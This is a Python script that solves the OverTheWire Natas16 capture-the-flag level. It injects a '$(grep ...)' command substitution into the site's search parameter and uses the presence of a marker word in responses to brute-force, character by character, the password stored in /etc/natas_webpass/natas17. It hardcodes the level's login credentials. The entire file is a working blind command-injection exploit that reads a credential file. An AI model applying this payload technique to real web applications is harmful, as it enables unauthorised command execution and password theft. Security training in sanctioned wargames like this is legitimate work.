import requests
import string


url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")


characters = string.ascii_letters + string.digits
password = ""


while len(password) < 32:
    for character in characters:
        guess = password + character

        payload = f"$(grep ^{guess} /etc/natas_webpass/natas17)Africans"

        response = requests.get(url, auth=auth, params={"needle": payload})

        if "Africans" not in response.text:
            password = guess
            print(password, flush=True)
            break
